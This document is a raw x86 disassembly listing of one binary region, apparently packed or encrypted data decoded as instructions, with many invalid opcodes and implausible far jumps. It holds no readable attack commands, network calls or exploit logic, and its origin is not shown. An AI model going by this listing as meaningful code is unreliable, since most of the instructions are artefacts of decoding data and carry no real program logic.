  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0xda942641
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [edx-0x6fffffa],al
  41edc3:	xchg   ebx,eax
  41edc4:	and    al,0x60
  41edc6:	mov    ds:0xf88cb958,al
  41edcb:	outs   dx,DWORD PTR ds:[esi]
  41edcc:	lds    ebp,FWORD PTR [ebx+0xd]
  41edcf:	aad    0x51
  41edd1:	push   ds
  41edd2:	or     BYTE PTR [ebx-0x34],ah
  41edd5:	pop    edx
  41edd6:	xlat   BYTE PTR ds:[ebx]
  41edd7:	add    eax,0x63780143
  41eddc:	jae    0x41eddf
  41edde:	gs cmp ebp,ebx
  41ede1:	mov    cl,0x68
  41ede3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ede4:	push   0xffffffa3
  41ede6:	add    BYTE PTR [ecx+0x4f],dh
  41ede9:	sbb    dl,BYTE PTR ds:0x1e192eed
  41edef:	cmp    al,0xb5
  41edf1:	mov    ebx,0xe99f0f92
  41edf6:	lods   al,BYTE PTR ds:[esi]
  41edf7:	xor    dh,dh
  41edf9:	in     al,dx
  41edfa:	xchg   ecx,eax
  41edfb:	xchg   edx,eax
  41edfc:	pop    eax
  41edfd:	push   esi
  41edfe:	popa   
  41edff:	mov    al,ds:0x7ccd6047
  41ee04:	stc    
  41ee05:	pop    eax
  41ee06:	loope  0x41ee4c
  41ee08:	cmp    eax,DWORD PTR [edi]
  41ee0a:	sar    BYTE PTR [ebx+0x72],1
  41ee0d:	(bad)  
  41ee0f:	pop    ss
  41ee10:	shr    DWORD PTR [ebx+0x4b1a8768],1
  41ee16:	mov    cl,0x1a
  41ee18:	or     BYTE PTR [edx+0x55111ef4],dl
  41ee1e:	dec    edx
  41ee1f:	inc    esi
  41ee20:	xchg   edx,eax
  41ee21:	stc    
  41ee22:	ret    0x888
  41ee25:	jmp    0x9142f5ac
  41ee2a:	jmp    0xe736:0xe230e834
  41ee31:	sbb    esp,DWORD PTR [ebp+ecx*4-0x41]
  41ee35:	test   al,0xeb
  41ee37:	jl     0x41edfb
  41ee39:	xchg   esp,eax
  41ee3a:	ficomp DWORD PTR [edi+eiz*2]
  41ee3d:	stos   DWORD PTR es:[edi],eax
  41ee3e:	sbb    al,0x82
  41ee40:	(bad)  
  41ee41:	push   ss
  41ee42:	pop    ss
  41ee43:	cmp    al,0x86
  41ee45:	(bad)  
  41ee46:	imul   esp,eax,0xd7e5aa8f
  41ee4c:	push   eax
  41ee4d:	lock (bad) 
  41ee4f:	ins    DWORD PTR es:[edi],dx
  41ee50:	xchg   esi,eax
  41ee51:	xor    edx,DWORD PTR [edx+0x28c6a52a]
  41ee57:	sub    al,0xf2
  41ee59:	pop    ds
  41ee5a:	and    DWORD PTR [ebx+0x76],ecx
  41ee5d:	out    0x62,eax
  41ee5f:	mov    esp,DWORD PTR [ecx-0x667352ff]
  41ee65:	psllw  mm0,QWORD PTR [edx]
  41ee68:	xchg   esi,eax
  41ee69:	nop
  41ee6a:	pop    edx
  41ee6b:	repz or BYTE PTR [esi+0x4f],cl
  41ee6f:	out    dx,al
  41ee70:	and    al,BYTE PTR [ecx+0x25]
  41ee73:	push   ebx
  41ee74:	mov    dh,0x7
  41ee76:	push   edi
  41ee77:	jg     0x41eef2
  41ee79:	repnz test eax,eax
  41ee7c:	fidivr WORD PTR [ebx-0x6b]
  41ee7f:	push   edx
  41ee80:	and    DWORD PTR [edi],eax
  41ee82:	mov    ecx,0x936358
  41ee87:	sub    cl,BYTE PTR cs:0xc92053f4
  41ee8e:	gs jmp 0xc948:0x35212714
  41ee96:	cmc    
  41ee97:	or     BYTE PTR [edx],ch
  41ee99:	mov    edi,0xe04ee232
  41ee9e:	jne    0x41ee49
  41eea0:	sbb    BYTE PTR [ebx-0x5a],bh
  41eea3:	xchg   ebp,eax
  41eea4:	and    eax,0x45657d2d
  41eea9:	sbb    DWORD PTR [edx+0x6d841cc7],ebx
  41eeaf:	pop    eax
  41eeb0:	jb     0x41ee9a
  41eeb2:	jne    0x41ef02
  41eeb4:	mov    ebp,0xb63c61b9
  41eeb9:	jnp    0x41ef35
  41eebb:	jmp    0x1f33:0xadc37881
  41eec2:	lods   al,BYTE PTR ds:[esi]
  41eec3:	sub    al,0x10
  41eec5:	jmp    0xec48c3aa
  41eeca:	test   DWORD PTR [eax-0x2a],ecx
  41eecd:	sbb    BYTE PTR [ebp-0x4fbaa3d7],0xc8
  41eed4:	popf   
  41eed5:	inc    esi
  41eed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed7:	fnop   
  41eed9:	and    cl,dh
  41eedb:	fcomp  st(1)
  41eedd:	pushf  
  41eede:	hlt    
  41eedf:	iret   
  41eee0:	ins    DWORD PTR es:[edi],dx
  41eee1:	xchg   ebp,eax
  41eee2:	mov    ebp,0x75c1115b
  41eee7:	sub    BYTE PTR es:[ecx+0x56ea2b08],dh
  41eeee:	sub    BYTE PTR [edi],cl
  41eef0:	cmp    DWORD PTR [ebx-0x64c107a9],esp
  41eef6:	jle    0x41eec5
  41eef8:	and    DWORD PTR [eax-0xa],ebp
  41eefb:	inc    ecx
  41eefc:	pop    esi
  41eefd:	jb     0x41ef62
  41eeff:	cmp    bl,dh
  41ef01:	mov    ah,0x5e
  41ef03:	mov    al,0x62
  41ef05:	fadd   QWORD PTR [ebx]
  41ef07:	pop    esp
  41ef08:	fld    QWORD PTR [edx+0x41]
  41ef0b:	(bad)  
  41ef0c:	mov    esp,0x4ddb7d36
  41ef11:	jmp    0xa19819b3
  41ef16:	mov    dl,0xb0
  41ef18:	popa   
  41ef19:	dec    edx
  41ef1a:	outs   dx,DWORD PTR ds:[esi]
  41ef1b:	adc    eax,0x955eb9a5
  41ef20:	jge    0x41eed4
  41ef22:	add    ch,BYTE PTR [edx+edx*4-0x53]
  41ef26:	fcom   DWORD PTR [ecx+0x20]
  41ef29:	daa    
  41ef2a:	fimul  DWORD PTR [ebp-0x17]
  41ef2d:	in     al,dx
  41ef2e:	stos   DWORD PTR es:[edi],eax
  41ef2f:	lds    esp,FWORD PTR [ebp-0x6c5a78c1]
  41ef35:	scas   eax,DWORD PTR es:[edi]
  41ef36:	fwait
  41ef37:	xor    edx,DWORD PTR [edi+0x5b197d2a]
  41ef3d:	jle    0x41ef1d
  41ef3f:	xor    bh,BYTE PTR [ebx+0x3c5724b6]
  41ef45:	test   eax,0x38061dda
  41ef4a:	lds    esp,FWORD PTR [edx-0x77]
  41ef4d:	adc    BYTE PTR [eax-0x68],bh
  41ef50:	or     DWORD PTR [esi],esp
  41ef52:	repz sbb DWORD PTR [edx],0x1e
  41ef56:	mov    ebp,0xd009a0f5
  41ef5b:	mov    DWORD PTR [eax+0x5113a83b],eax
  41ef61:	lods   eax,DWORD PTR ds:[esi]
  41ef62:	push   es
  41ef63:	push   es
  41ef64:	push   es
  41ef65:	adc    eax,0x6c904621
  41ef6a:	cld    
  41ef6b:	imul   edi,DWORD PTR [eax],0x1a2f6249
  41ef71:	xor    DWORD PTR [esi+0x331a3946],ebx
  41ef77:	push   0x10ba2313
  41ef7c:	mov    al,0xcf
  41ef7e:	ins    BYTE PTR es:[edi],dx
  41ef7f:	pop    edi
  41ef80:	(bad)  
  41ef81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef82:	scas   al,BYTE PTR es:[edi]
  41ef83:	cmp    al,0x71
  41ef85:	dec    esp
  41ef86:	inc    esp
  41ef87:	ret    0xb8d4
  41ef8a:	mov    al,0xfe
  41ef8c:	sub    DWORD PTR [ebp-0x4d],edi
  41ef8f:	sub    al,0xc2
  41ef91:	adc    al,0x32
  41ef93:	mov    eax,0x75aa10db
  41ef98:	adc    BYTE PTR [ecx],ch
  41ef9a:	les    ebx,FWORD PTR [ebp+0x52]
  41ef9d:	or     BYTE PTR [eax+ecx*1-0x56],0xfa
  41efa2:	fist   WORD PTR [ebx]
  41efa4:	data16 sar BYTE PTR [esi+0x79fb2c14],1
  41efab:	push   edi
  41efac:	push   esp
  41efad:	cld    
  41efae:	jecxz  0x41f00a
  41efb0:	inc    esp
  41efb1:	scas   al,BYTE PTR es:[edi]
  41efb2:	push   edx
  41efb3:	into   
  41efb4:	push   ebx
  41efb5:	lods   eax,DWORD PTR ds:[esi]
  41efb6:	fdivrp st(7),st
  41efb8:	sub    eax,DWORD PTR [eax+0x5e5f56db]
  41efbe:	pop    esp
  41efbf:	rcr    cl,0xc6
  41efc2:	lahf   
  41efc3:	das    
  41efc4:	fnstenv [ecx]
  41efc6:	(bad)  
  41efc7:	jmp    0x41f002
  41efc9:	(bad)  
  41efca:	push   ebp
  41efcb:	out    0xa8,eax
  41efcd:	and    ebx,0xfc414bf0
  41efd3:	push   esi
  41efd4:	jl     0x41efe9
  41efd6:	jo     0x41efc9
  41efd8:	add    eax,0xb0a77e60
  41efdd:	fwait
  41efde:	outs   dx,DWORD PTR ds:[esi]
  41efdf:	inc    ebx
  41efe0:	in     al,0x17
  41efe2:	pop    edx
  41efe3:	adc    DWORD PTR [edi],ebp
  41efe5:	add    BYTE PTR [ebp-0x61],bh
  41efe8:	xchg   edx,eax
  41efe9:	daa    
  41efea:	mov    ds:0xd52cfcfc,eax
  41efef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eff0:	mov    bh,0x77
  41eff2:	push   es
  41eff3:	std    
  41eff4:	cmp    BYTE PTR [ebp+0x41],cl
  41eff7:	cmp    bh,0x4d
  41effa:	dec    ebp
  41effb:	test   ch,bh
  41effd:	jb     0x41f04c
  41efff:	lds    esp,FWORD PTR ds:0xfbf7af17
  41f005:	in     eax,dx
  41f006:	es or  dl,0x94
  41f00a:	hlt    
  41f00b:	and    DWORD PTR [edx-0x71],esp
  41f00e:	jge    0x41efd6
  41f010:	enter  0x6f8,0xe6
  41f014:	(bad)  
  41f015:	jne    0x41f026
  41f017:	jns    0x41f076
  41f019:	cmp    eax,DWORD PTR [esi-0x7ea3d38]
  41f01f:	xchg   ebp,eax
  41f020:	push   0xac376bf9
  41f025:	lods   eax,DWORD PTR ds:[esi]
  41f026:	and    DWORD PTR [ecx+0x2bfc7407],edx
  41f02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f02d:	stc    
  41f02e:	iret   
  41f02f:	iret   
  41f030:	mov    eax,ds:0x19b41314
  41f035:	mov    eax,0x6ef198b1
  41f03a:	pop    ds
  41f03b:	in     eax,0xcb
  41f03d:	pop    eax
  41f03e:	jne    0x41efe2
  41f040:	in     eax,dx
  41f041:	push   edi
  41f042:	imul   ecx,DWORD PTR [ebp-0x577495e0],0xb98c599b
  41f04c:	cmp    dh,BYTE PTR [ebp-0x379fb34b]
  41f052:	sbb    BYTE PTR [eax+0xf],ch
  41f055:	cmp    eax,0xb9c4e307
  41f05a:	sbb    al,0x11
  41f05c:	mov    ds,ebp
  41f05e:	jns    0x41f01f
  41f060:	or     bh,BYTE PTR ds:0xc8789684
  41f066:	pop    ebp
  41f067:	int    0x69
  41f069:	test   BYTE PTR [edx-0x170b6a0b],ch
  41f06f:	pushf  
  41f070:	loope  0x41f055
  41f072:	call   0x99d3:0x1d432369
  41f079:	sbb    DWORD PTR [ecx-0x5c],0xffffffb6
  41f07d:	jne    0x41f045
  41f07f:	jbe    0x41f096
  41f081:	aaa    
  41f082:	out    0xdc,al
  41f084:	jge    0x41f09c
  41f086:	add    bl,BYTE PTR [eax+0x7237305]
  41f08c:	pushf  
  41f08d:	jp     0x41f022
  41f08f:	in     al,dx
  41f090:	popf   
  41f091:	push   es
  41f092:	aaa    
  41f093:	xchg   BYTE PTR [ecx],dh
  41f095:	lods   al,BYTE PTR ds:[esi]
  41f096:	inc    esp
  41f097:	js     0x41f021
  41f099:	repnz xor al,0x5c
  41f09c:	add    eax,0x489ca9ca
  41f0a1:	xchg   esi,eax
  41f0a2:	mov    ds:0x726c4015,al
  41f0a7:	fnstsw WORD PTR [eax+eiz*2+0x1c]
  41f0ab:	xor    DWORD PTR [edx-0x32],esp
  41f0ae:	mov    eax,ds:0x2f40a87
  41f0b3:	scas   al,BYTE PTR es:[edi]
  41f0b4:	in     eax,dx
  41f0b5:	or     eax,0x4d9f2314
  41f0ba:	adc    eax,0xd46df53
  41f0bf:	push   esp
  41f0c0:	add    esi,DWORD PTR [esi+0x4a32c884]
  41f0c6:	dec    eax
  41f0c7:	sbb    DWORD PTR [edi-0x21a8853a],esi
  41f0cd:	sbb    dl,al
  41f0cf:	mov    esi,0xf8fd3a66
  41f0d5:	rcr    edx,1
  41f0d7:	mov    bl,0xe2
  41f0d9:	pop    ebp
  41f0da:	sub    BYTE PTR [ebx],0x26
  41f0dd:	or     eax,0xf37110d0
  41f0e2:	int    0xb9
  41f0e4:	pop    ecx
  41f0e5:	xor    ah,dh
  41f0e7:	lods   eax,DWORD PTR ds:[esi]
  41f0e8:	pop    ecx
  41f0e9:	mov    bh,0x84
  41f0eb:	mov    esp,DWORD PTR [ebx+ebx*4-0x46]
  41f0ef:	fs mov bl,bl
  41f0f2:	mov    cs,WORD PTR [edi-0x50]
  41f0f5:	std    
  41f0f6:	shl    BYTE PTR [esi+0x64200d26],cl
  41f0fc:	ds dec edi
  41f0fe:	in     eax,0xb
  41f100:	add    eax,0x5ddc90ec
  41f105:	(bad)  
  41f106:	jmp    0x7858522a
  41f10b:	ins    BYTE PTR es:[edi],dx
  41f10c:	xor    bl,0x31
  41f10f:	adc    esp,edx
  41f111:	aad    0x4b
  41f113:	sbb    eax,0xe1b5a400
  41f118:	int    0x72
  41f11a:	repz dec edi
  41f11c:	or     DWORD PTR [ebx+0x5efb05d],0xd82f7f66
  41f126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f127:	sahf   
  41f128:	and    ah,BYTE PTR [esi]
  41f12a:	pop    eax
  41f12b:	xchg   ecx,eax
  41f12c:	pushf  
  41f12d:	cs mov ebp,0x4e07adce
  41f133:	or     eax,0x43636655
  41f138:	loop   0x41f19e
  41f13a:	fadd   QWORD PTR [edx+0x20]
  41f13d:	int    0x9b
  41f13f:	lods   al,BYTE PTR ds:[esi]
  41f140:	fnstsw WORD PTR [edi-0x71]
  41f143:	xsha256 (bad)
  41f144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f145:	adc    eax,0xbe43342f
  41f14a:	out    dx,eax
  41f14b:	lock repz sub al,0x8
  41f14f:	or     BYTE PTR [ebp-0x2],dh
  41f152:	or     esp,DWORD PTR [eax]
  41f154:	shr    DWORD PTR [ebp-0x34c39e40],0x95
  41f15b:	(bad)  
  41f15c:	xchg   ebx,eax
  41f15d:	mov    edi,0x65153b29
  41f162:	call   0x9145:0x4fe28b57
  41f169:	push   ss
  41f16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16b:	leave  
  41f16c:	les    ebp,FWORD PTR [ebx+ecx*2]
  41f16f:	fiadd  DWORD PTR [eax]
  41f171:	jns    0x41f0fa
  41f173:	icebp  
  41f174:	lods   al,BYTE PTR ds:[esi]
  41f175:	aad    0xf
  41f177:	fld    TBYTE PTR [ebx]
  41f179:	mov    ah,0x18
  41f17b:	lods   eax,DWORD PTR ds:[esi]
  41f17c:	fwait
  41f17d:	lds    esi,FWORD PTR [eax+0xa32fb25]
  41f183:	dec    esi
  41f184:	pop    ss
  41f185:	pop    ss
  41f186:	shl    ebp,cl
  41f188:	push   esp
  41f189:	pop    ebx
  41f18a:	pop    ds
  41f18b:	into   
  41f18c:	fadd   DWORD PTR [ebx]
  41f18e:	into   
  41f18f:	mov    al,0xd4
  41f191:	mov    ax,0x61ae
  41f195:	test   al,0xd5
  41f197:	dec    esp
  41f198:	sbb    dl,BYTE PTR [eax+eiz*4]
  41f19b:	dec    esi
  41f19c:	xor    bh,al
  41f19e:	fnsave [ebx-0x730cd312]
  41f1a4:	ds and eax,0xb5c5578e
  41f1aa:	popf   
  41f1ab:	push   ecx
  41f1ac:	cs mov bl,0xf8
  41f1af:	fbld   TBYTE PTR [ecx+ebx*8-0x80]
  41f1b3:	scas   al,BYTE PTR es:[edi]
  41f1b4:	(bad)  
  41f1b5:	jo     0x41f1f2
  41f1b7:	fsub   DWORD PTR [esi+ebp*2-0x51847c6b]
  41f1be:	(bad)  
  41f1bf:	mov    al,0xb4
  41f1c1:	sub    DWORD PTR [eax-0x36],ecx
  41f1c4:	clc    
  41f1c5:	cmp    ecx,DWORD PTR [ecx+edi*8-0x64256ea2]
  41f1cc:	lock imul ebx,DWORD PTR [eax],0xb
  41f1d0:	mov    edi,0xc9cff33e
  41f1d5:	mov    gs,WORD PTR [ebx-0x57]
  41f1d8:	aad    0xe5
  41f1da:	mov    al,0x8f
  41f1dc:	retf   0xd625
  41f1df:	cmp    DWORD PTR [eax+0x7c],edx
  41f1e2:	(bad)  
  41f1e3:	cmp    al,BYTE PTR [eax+0x5]
  41f1e6:	icebp  
  41f1e7:	lahf   
  41f1e8:	fs mov esp,0x1f72879b
  41f1ee:	cli    
  41f1ef:	and    esp,esp
  41f1f1:	call   DWORD PTR [edx]
  41f1f3:	jge    0x41f1eb
  41f1f5:	(bad)  
  41f1f6:	adc    eax,0xfb5edb68
  41f1fb:	mov    dl,0xe
  41f1fd:	dec    esi
  41f1fe:	mov    edi,0x48006e31
  41f203:	xchg   ecx,eax
  41f205:	je     0x41f194
  41f207:	lock jno 0x41f20a
  41f20a:	gs mov ebp,0xee833230
  41f210:	in     al,dx
  41f211:	push   cs
  41f212:	inc    eax
  41f213:	mov    esp,0xb0bc5818
  41f218:	push   ss
  41f219:	pop    ss
  41f21a:	cmp    al,dl
  41f21c:	mov    ds:0xf579493,eax
  41f221:	sti    
  41f222:	pop    eax
  41f223:	rcl    esi,0xe9
  41f226:	cmp    al,0xbf
  41f228:	adc    ebx,esi
  41f22a:	bnd jp 0x41f23e
  41f22d:	push   ecx
  41f22e:	jl     0x41f29c
  41f230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f231:	pop    esp
  41f232:	fmul   DWORD PTR [eax]
  41f234:	scas   al,BYTE PTR es:[edi]
  41f235:	std    
  41f236:	dec    esp
  41f237:	mov    bh,0x7
  41f239:	and    eax,0xd3711d9b
  41f23e:	(bad)  
  41f23f:	mov    eax,ds:0xe5d7e3b7
  41f244:	int3   
  41f245:	adc    BYTE PTR [ebp-0x38],al
  41f248:	mov    edx,0xb57dd585
  41f24d:	fmul   DWORD PTR [ebx+0x2d73a3d9]
  41f253:	jg     0x41f28f
  41f255:	in     al,dx
  41f256:	xor    ch,BYTE PTR [ecx-0x5f5bed6b]
  41f25c:	cmp    al,0xc0
  41f25e:	les    ebp,FWORD PTR [ebx-0x26]
  41f261:	stos   DWORD PTR es:[edi],eax
  41f262:	jmp    0xc5cda10
  41f267:	aam    0x9a
  41f269:	pushf  
  41f26a:	loope  0x41f27d
  41f26c:	mov    esp,DWORD PTR ss:[edi+0x1e]
  41f270:	bnd jg 0x41f2ea
  41f273:	xchg   DWORD PTR [edi],ebp
  41f275:	dec    ecx
  41f276:	pop    ds
  41f277:	push   edi
  41f278:	add    BYTE PTR ds:0xd996c933,cl
  41f27e:	jbe    0x41f254
  41f280:	jae    0x41f2f2
  41f282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f283:	les    esi,FWORD PTR [edi+0x5e]
  41f286:	cmp    eax,0x48938a86
  41f28b:	inc    esp
  41f28c:	cmp    al,0x89
  41f28e:	or     bl,dl
  41f290:	in     eax,dx
  41f291:	mov    DWORD PTR [esi+0x39],ebx
  41f294:	rol    eax,1
  41f296:	inc    edx
  41f297:	add    eax,0x84c0f9d5
  41f29c:	stc    
  41f29d:	xorps  xmm1,XMMWORD PTR [eax]
  41f2a0:	add    BYTE PTR [ecx],0xc
  41f2a3:	jo     0x41f286
  41f2a5:	fs mov cl,0xed
  41f2a8:	inc    eax
  41f2a9:	std    
  41f2aa:	cmp    eax,0xb77829a2
  41f2af:	(bad)  [ebx]
  41f2b1:	jecxz  0x41f2ea
  41f2b3:	call   0x8b69:0x8eb22f74
  41f2ba:	stos   DWORD PTR es:[edi],eax
  41f2bb:	push   ds
  41f2bc:	xor    al,0x35
  41f2be:	pop    eax
  41f2bf:	aas    
  41f2c0:	and    BYTE PTR [edi],0x78
  41f2c3:	imul   ecx,DWORD PTR [ebx],0xc8fbd0ae
  41f2c9:	mov    ebp,0x75c2246e
  41f2ce:	(bad)  
  41f2cf:	and    eax,0x1e05e4d7
  41f2d4:	js     0x41f30f
  41f2d6:	ja     0x41f33d
  41f2d8:	test   al,0xc0
  41f2db:	xchg   ah,al
  41f2dd:	mov    esp,0x1fe8aba
  41f2e2:	dec    ebx
  41f2e3:	xchg   esi,ebp
  41f2e5:	iret   
  41f2e6:	push   ebp
  41f2e7:	xchg   edi,eax
  41f2e8:	data16 sti 
  41f2ea:	ret    
  41f2eb:	jecxz  0x41f358
  41f2ed:	or     BYTE PTR [esi-0x3d],al
  41f2f0:	pop    ebp
  41f2f1:	lds    edx,FWORD PTR [eax-0x3186ae00]
  41f2f7:	pusha  
  41f2f8:	and    edi,ecx
  41f2fa:	dec    edi
  41f2fb:	xor    DWORD PTR [eax-0x73],esp
  41f2fe:	pushf  
  41f2ff:	ret    0xfa4c
  41f302:	stc    
  41f303:	loop   0x41f29f
  41f305:	retf   
  41f306:	sbb    BYTE PTR [ebp-0x54d60ec6],0xba
  41f30d:	ror    DWORD PTR [edi],0x7c
  41f310:	jno    0x41f2bb
  41f312:	in     eax,0x46
  41f314:	jecxz  0x41f2b9
  41f316:	mov    dl,0x33
  41f318:	pusha  
  41f319:	add    dh,bl
  41f31b:	retf   0x792a
  41f31e:	xlat   BYTE PTR ds:[ebx]
  41f31f:	sbb    DWORD PTR [esi],edi
  41f321:	pop    ds
  41f322:	jne    0x41f2db
  41f324:	sbb    eax,0xc22fe31b
  41f329:	std    
  41f32a:	inc    ebx
  41f32b:	push   ebx
  41f32c:	mov    al,0x2a
  41f32e:	pop    esp
  41f32f:	ds stos BYTE PTR es:[edi],al
  41f331:	mov    ebx,0x6a1187c0
  41f336:	jnp    0x41f34f
  41f338:	(bad)  
  41f339:	inc    ebx
  41f33a:	addr16 icebp 
  41f33c:	in     eax,0xab
  41f33e:	cdq    
  41f33f:	sbb    cl,BYTE PTR [edx]
  41f341:	bound  edi,QWORD PTR [edi+0xa]
  41f344:	jae    0x41f355
  41f346:	jl     0x41f30a
  41f348:	lea    esi,ds:0xb07f06b2
  41f34e:	aam    0x69
  41f350:	cmp    esi,edi
  41f352:	mov    edx,0x273f6784
  41f357:	cmp    eax,esp
  41f359:	sbb    edi,eax
  41f35b:	xchg   ebp,eax
  41f35c:	mov    al,0x25
  41f35e:	es xor ch,bh
  41f361:	sbb    edx,DWORD PTR [edi]
  41f363:	cmp    ebp,edx
  41f365:	fbld   TBYTE PTR [edx]
  41f367:	mov    edx,0x85b6f120
  41f36c:	adc    edi,DWORD PTR [edx-0x31]
  41f36f:	out    dx,al
  41f370:	pop    es
  41f371:	jp     0x41f3c1
  41f373:	leave  
  41f374:	fistp  WORD PTR [ecx-0x1d]
  41f377:	shr    ecx,0x6f
  41f37a:	xlat   BYTE PTR ds:[ebx]
  41f37b:	(bad)  
  41f37c:	lahf   
  41f37d:	inc    edi
  41f37e:	push   0x571d0f2e
  41f383:	add    eax,0xf902aa0f
